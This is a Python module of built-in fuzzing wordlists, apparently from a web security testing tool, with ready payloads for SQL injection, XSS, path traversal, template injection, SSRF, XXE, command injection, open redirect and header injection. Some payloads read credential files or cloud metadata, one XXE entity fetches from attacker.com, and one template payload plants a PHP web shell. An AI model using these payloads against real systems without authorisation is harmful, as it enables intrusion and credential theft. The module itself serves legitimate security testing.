"""Built-in wordlists for fuzzing.

Contains curated payload lists for various vulnerability types.
"""
from typing import Literal

# SQL Injection payloads - comprehensive set
SQLI_PAYLOADS = [
    # Basic detection
    "'",
    "''",
    '"',
    '""',
    "`",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    '" OR "1"="1"--',
    "' OR ''='",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    # Time-based
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    # Stacked queries
    "'; SELECT 1;--",
    "'; INSERT INTO users VALUES('test','test');--",
    # Encoded variants
    "%27",
    "%27%20OR%20%271%27%3D%271",
    "%27%20AND%20SLEEP(5)--%20",
    "' %00",
    # Comment variations
    "' -- -",
    "' --+",
    "'/**/OR/**/1=1--",
    # Unicode/special
    "' OR '1'='1' -- ",
    "admin'--",
    "admin' #",
    "admin'/*",
]

# XSS payloads - diverse set for different contexts
XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x onerror=\"alert(1)\">",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    # Event handlers
    "<div onmouseover=alert(1)>hover</div>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    # Attribute injection
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus x=\"",
    # JavaScript URLs
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    # Encoded variants
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert&#40;1&#41;>",
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'\"--></style></script><script>alert(1)</script>",
    # Filter bypass
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    # DOM-based
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=top['al'+'ert'](1)>",
    # SVG
    "<svg><animate onbegin=alert(1)>",
    "<svg><set onbegin=alert(1)>",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    # Basic
    "../",
    "..\\",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    # Encoded
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%5c",
    "%252e%252e%252f",
    "..%252f",
    # Double encoding
    "%252e%252e%252f%252e%252e%252f",
    # Unicode
    "..%c0%af",
    "..%c1%9c",
    "%c0%ae%c0%ae%c0%af",
    # Null byte
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    # Targets
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../proc/self/environ",
    "../../../var/log/apache2/access.log",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\boot.ini",
    # Absolute paths
    "/etc/passwd",
    "c:\\windows\\win.ini",
    "file:///etc/passwd",
]

# SSTI payloads for various template engines
SSTI_PAYLOADS = [
    # Detection
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{7*'7'}}",
    # Jinja2/Twig
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.items()}}",
    "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}",
    # Freemarker
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    # Velocity
    "#set($str=$class.inspect(\"java.lang.String\").type)",
    "#set($chr=$class.inspect(\"java.lang.Character\").type)",
    "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))",
    # Smarty
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    # ERB
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",
    # Pebble
    "{% set cmd = 'id' %}",
]

# SSRF payloads
SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0",
    "http://127.1",
    "http://127.0.1",
    "http://2130706433",  # Decimal IP
    "http://0x7f000001",  # Hex IP
    "http://017700000001",  # Octal IP
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal services
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    # Protocol handlers
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:11211/stat",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
    # DNS rebinding setup
    "http://spoofed.burpcollaborator.net",
    # Bypass techniques
    "http://127.0.0.1.nip.io",
    "http://127.0.0.1.xip.io",
    "http://localtest.me",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
]

# XXE payloads
XXE_PAYLOADS = [
    # Basic external entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo></foo>',
    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    # Billion laughs (DoS) - use carefully
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    # UTF-16 encoded
    '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    # SVG XXE
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    # Unix command separators
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "\n id",
    "\r\n id",
    # Windows command separators
    "& whoami",
    "| whoami",
    "|| whoami",
    "&& whoami",
    # Time-based
    "; sleep 5",
    "| sleep 5",
    "& timeout 5",
    "| ping -n 5 127.0.0.1",
    # Output redirection
    "; id > /tmp/out",
    "| id > /tmp/out",
    # Encoded
    "%3B id",
    "%7C id",
    "%26 id",
    # Argument injection
    "-v",
    "--version",
    "-h",
    "--help",
    "|| true",
    "&& false",
]

# Open redirect payloads
OPEN_REDIRECT_PAYLOADS = [
    # Basic
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "\\/evil.com",
    # Protocol relative
    "//evil.com/",
    "///evil.com",
    "////evil.com",
    # Encoded
    "%2f%2fevil.com",
    "%2f%5cevil.com",
    "%5c%2fevil.com",
    "//evil%2ecom",
    # Bypass techniques
    "https:evil.com",
    "https:/evil.com",
    "https://evil.com%2f%2f",
    "//evil.com/%2f..",
    "////evil.com//",
    # With credentials
    "https://expected.com@evil.com",
    "https://expected.com:pass@evil.com",
    # Fragment
    "//evil.com#expected.com",
    "//evil.com?expected.com",
    # JavaScript (if applicable)
    "javascript:alert(document.domain)//",
    "data:text/html,<script>location='https://evil.com'</script>",
]

# Header injection payloads
HEADER_INJECTION_PAYLOADS = [
    # CRLF injection
    "%0d%0aX-Injected: header",
    "%0aX-Injected: header",
    "%0dX-Injected: header",
    "\r\nX-Injected: header",
    "\nX-Injected: header",
    "\rX-Injected: header",
    # Response splitting
    "%0d%0a%0d%0a<html>injected</html>",
    "\r\n\r\n<html>injected</html>",
    # Host header attacks
    "evil.com",
    "evil.com:80",
    "expected.com@evil.com",
    "expected.com:evil.com",
    "expected.com\tevil.com",
    "expected.com%00evil.com",
]

# Map wordlist names to payloads
WORDLISTS: dict[str, list[str]] = {
    "sqli": SQLI_PAYLOADS,
    "sql_injection": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "cross_site_scripting": XSS_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "lfi": PATH_TRAVERSAL_PAYLOADS,
    "directory_traversal": PATH_TRAVERSAL_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "template_injection": SSTI_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "xxe": XXE_PAYLOADS,
    "xml_external_entity": XXE_PAYLOADS,
    "cmd_injection": CMD_INJECTION_PAYLOADS,
    "rce": CMD_INJECTION_PAYLOADS,
    "command_injection": CMD_INJECTION_PAYLOADS,
    "open_redirect": OPEN_REDIRECT_PAYLOADS,
    "redirect": OPEN_REDIRECT_PAYLOADS,
    "header_injection": HEADER_INJECTION_PAYLOADS,
    "crlf": HEADER_INJECTION_PAYLOADS,
}


def get_payloads(
    wordlist_name: str,
    encoding: Literal["none", "url", "double_url", "base64", "unicode"] = "none",
    max_payloads: int | None = None,
) -> list[str]:
    """Get payloads from a wordlist with optional encoding.
    
    Args:
        wordlist_name: Name of the wordlist to retrieve
        encoding: Encoding to apply to payloads
        max_payloads: Maximum number of payloads to return
        
    Returns:
        List of payloads, optionally encoded
    """
    import base64
    import urllib.parse
    
    wordlist_lower = wordlist_name.lower()
    
    if wordlist_lower not in WORDLISTS:
        available = ", ".join(sorted(set(WORDLISTS.keys())))
        raise ValueError(f"Unknown wordlist: {wordlist_name}. Available: {available}")
    
    payloads = WORDLISTS[wordlist_lower].copy()
    
    # Apply encoding
    if encoding == "url":
        payloads = [urllib.parse.quote(p) for p in payloads]
    elif encoding == "double_url":
        payloads = [urllib.parse.quote(urllib.parse.quote(p)) for p in payloads]
    elif encoding == "base64":
        payloads = [base64.b64encode(p.encode()).decode() for p in payloads]
    elif encoding == "unicode":
        payloads = [p.encode("unicode_escape").decode() for p in payloads]
    
    if max_payloads:
        payloads = payloads[:max_payloads]
    
    return payloads


def list_available_wordlists() -> dict[str, int]:
    """List available wordlists with their payload counts.
    
    Returns:
        Dictionary mapping wordlist names to payload counts
    """
    # Deduplicate by actual list identity
    seen = set()
    result = {}
    
    for name, payloads in sorted(WORDLISTS.items()):
        payload_id = id(payloads)
        if payload_id not in seen:
            result[name] = len(payloads)
            seen.add(payload_id)
    
    return result
